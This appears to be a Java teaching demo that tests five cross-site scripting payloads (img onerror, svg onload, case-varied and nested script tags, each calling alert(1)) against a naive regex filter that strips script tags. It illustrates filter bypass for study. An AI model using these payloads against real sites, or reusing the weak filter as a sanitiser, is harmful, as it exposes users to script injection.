public class XSSBypass {
    // Simple filter: removes <script> tags
    static String basicFilter(String input) {
        return input.replaceAll("(?i)<script.*?>.*?</script>", "");
    }
    public static void main(String[] args) {
        String[] payloads = {
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>"
        };
        for (String p : payloads) {
            String filtered = basicFilter(p);
            boolean bypassed = filtered.contains("alert") && (filtered.contains("onerror") || filtered.contains("onload") || filtered.contains("<scr"));
            System.out.println("Payload: " + p);
            System.out.println("  After filter: " + filtered);
            System.out.println("  Bypassed: " + (bypassed || filtered.contains("<img") || filtered.contains("<svg")));
            System.out.println();
        }
    }
}

